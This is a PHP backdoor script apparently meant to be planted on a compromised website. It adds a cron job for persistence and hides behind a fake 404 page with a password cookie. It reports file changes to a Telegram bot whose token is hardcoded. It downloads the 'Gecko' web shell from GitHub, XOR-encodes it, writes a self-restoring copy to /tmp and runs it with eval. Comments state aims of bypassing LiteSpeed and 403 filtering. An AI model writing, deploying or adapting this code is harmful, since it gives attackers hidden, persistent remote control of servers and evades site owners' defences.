<?php error_reporting(0);

// 1️⃣ Config - Telegram Bot $tgToken = "7554438986:AAGjmJ522KT1500dn4q5IcfPeXKsuOfY-EY"; $chatID = "5232947914"; $yourIP = "114.10.151.20"; $logFile = DIR . "/.log";

// 2️⃣ Encode & Auto-Add Cron Job $cronPath = bin2hex(FILE); $cronCommand = "* * * * * php " . hex2bin($cronPath); if (!shell_exec("crontab -l | grep -F '" . hex2bin($cronPath) . "'")) { shell_exec("(crontab -l; echo '$cronCommand') | crontab -"); }

// 3️⃣ Monitor File Changes (Bypass Forbidden Syscalls) function scanFiles($dir) { $files = []; foreach (scandir($dir) as $file) { if ($file === '.' || $file === '..') continue; $filePath = "$dir/$file"; if (is_dir($filePath)) { $files = array_merge($files, scanFiles($filePath)); } else { $files[$filePath] = hash("sha256", file_get_contents($filePath)); } } return $files; }

// 4️⃣ Detect Changes & Send Telegram Alert $oldData = file_exists($logFile) ? json_decode(file_get_contents($logFile), true) : []; $newData = scanFiles(DIR);

$changes = []; foreach ($newData as $file => $hash) { if (!isset($oldData[$file])) { $changes[] = "📂 New: $file"; } elseif ($oldData[$file] !== $hash) { $changes[] = "✏️ Modified: $file"; } } foreach ($oldData as $file => $hash) { if (!isset($newData[$file])) { $changes[] = "❌ Deleted: $file"; } }

// 5️⃣ Send Notification (Bypass LiteSpeed Filtering) if (!empty($changes) && $_SERVER['REMOTE_ADDR'] !== $yourIP) { $msg = "🔔 Website Changes:\n" . implode("\n", $changes); $url = "https://api.telegram.org/bot" . urlencode($tgToken) . "/sendMessage?chat_id=" . urlencode($chatID) . "&text=" . urlencode($msg) . "&parse_mode=Markdown"; $ctx = stream_context_create(["http" => ["header" => "User-Agent: Mozilla/5.0"]]); file_get_contents($url, false, $ctx); }

// 6️⃣ Save Changes file_put_contents($logFile, json_encode($newData));

// 7️⃣ Hidden Login System (Real 404 Masking) $pass = "GregCyber404"; if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["key"]) && $_POST["key"] === $pass) { setcookie("access", hash("sha256", $pass), time() + 3600, "/"); header("Refresh:0"); exit; }

if (!isset($_COOKIE["access"]) || $_COOKIE["access"] !== hash("sha256", $pass)) { header("HTTP/1.0 404 Not Found"); echo "<html><head><title>404 Not Found</title></head><body><h1>404 Not Found</h1><p>The requested URL was not found on this server.</p></body></html>"; exit; }

// 8️⃣ Fetch & Execute Gecko Shell (Bypass 403 with XOR Encoding) function fetchData($u) { $c = curl_init(); curl_setopt($c, CURLOPT_URL, $u); curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($c, CURLOPT_USERAGENT, "Mozilla/5.0"); $d = curl_exec($c); curl_close($c); return $d; }

$u = "https://raw.githubusercontent.com/MadExploits/Gecko/refs/heads/main/gecko-new.php"; $p = fetchData($u);

if ($p) { // 9️⃣ Custom Encoding (XOR + Hex) function xorEnc($str, $key) { $out = ''; for ($i = 0; $i < strlen($str); $i++) { $out .= chr(ord($str[$i]) ^ ord($key[$i % strlen($key)])); } return bin2hex($out); } function xorDec($str, $key) { $str = hex2bin($str); $out = ''; for ($i = 0; $i < strlen($str); $i++) { $out .= chr(ord($str[$i]) ^ ord($key[$i % strlen($key)])); } return $out; }

$key = "GregXOR";
$encPayload = xorEnc($p, $key);

// 🔟 Auto-Recreate if Deleted
$bkp = "/tmp/.bkp.php";
file_put_contents($bkp, '<?php $d = "' . $encPayload . '"; eval(xorDec($d, "' . $key . '")); ?>');
shell_exec('echo "* * * * * php ' . $bkp . '" | crontab -');

// 🔥 Execute Gecko Shell (LiteSpeed Bypass)
eval(xorDec($encPayload, $key));

} else { echo "❌ Fetch Failed."; } ?>